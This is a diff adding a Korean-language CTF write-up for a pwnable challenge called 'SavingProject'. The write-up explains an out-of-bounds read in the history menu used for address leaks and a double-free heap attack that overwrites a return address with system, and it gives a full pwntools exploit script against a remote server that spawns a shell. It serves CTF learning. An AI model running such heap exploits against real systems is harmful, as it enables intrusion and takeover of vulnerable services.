@@ -242,3 +242,88 @@ print(plain_text)
 ```
 
 FLAG : 50_45_l0ng_45_1_liv3_1'll_l0v3_y0u
+
+## SavingProject - Pwnable 300pt
+
+바이너리를 보면 deposit, withdraw, history, modify 메뉴가 있다.
+
+deposit 메뉴를 보게 되면 32이하의 크기를 먼저 입력받고 malloc을 진행한다.
+그다음 0x21만큼 buf에 입력받은 뒤 strlen으로 다시 크기를 측정한 뒤에
+힙에 값을 넣어준다.
+
+withdraw 메뉴는 그냥 선택한 인덱스에 할당되어 있는지 확인한 뒤에 free해준다.
+
+modify 메뉴에서는 deposit 메뉴와 비슷하게 0x21만큼 buf에 입력받은 뒤 크기 측정후에 
+힙에 값을 넣어준다.
+
+history는 인덱스를 입력받고 인덱스에 해당하는 값을 출력해준다. 여기서 인덱스 검사를 따로 하지 않아서 oob가 터진다. 이걸로 스택, 라이브러리, 코드영역 주소가 Leak 가능하다.
+
+이 문제에서는 free를 할 때나 malloc을 할 때 따로 공간을 초기화하지 않아서
+double free와 free된 chunk의 fd 조작이 가능하다. 따라서 return address를 
+system으로 바꾸어주면 플래그를 얻을 수 있다.
+
+```
+from pwn import *
+
+p = remote("13.124.244.98",15927)
+#p = process("./SavingProject")
+e = ELF("./SavingProject")
+context.log_level='debug'
+
+def add(size,data):
+   p.sendlineafter("> ","1")
+   p.sendlineafter(": ",str(size))
+   p.sendlineafter(": ",data)
+   
+def delete(idx):
+   p.sendlineafter("> ","2")   
+   p.sendlineafter(": ",str(idx))
+
+def edit(idx,data):
+   p.sendlineafter("> ","4")
+   sleep(3)
+   p.sendlineafter(": ",str(idx))
+   p.sendlineafter(": ",data)
+
+def show(idx):
+   p.sendlineafter("> ","3")
+   p.sendlineafter(": ",str(idx))
+   p.recvuntil(":\n")
+   p.recvuntil(": ")
+   address = int(p.recvuntil("\n"),16)
+   p.recvuntil(": ")
+   data = p.recvuntil("\n")
+   return address,data
+
+#Libc Leak & Stack Leak
+show(-9)
+address,data = show(-9)
+libc_base = address - 0x7a81b
+system = libc_base +  0x45390
+
+address,data = show(-5)
+prev_size = address - 0x30
+
+log.success("Found libc base! : 0x%x"%libc_base)
+
+#Exploit
+add(0x20,"A"*4)
+add(0x20,"B"*4)
+
+delete(1)
+delete(2)
+delete(1)
+
+add(0x31,p64(prev_size))
+add(0x31,"A"*4)
+add(0x31,"B"*4)
+add(0x31,"/bin/sh;"*3+p64(system))
+
+p.interactive()
+```
+
+FLAG : The w0rld is a beautiful book, but 0f little u$e t0 him who cann0t r3ad it.
+
+
+
+
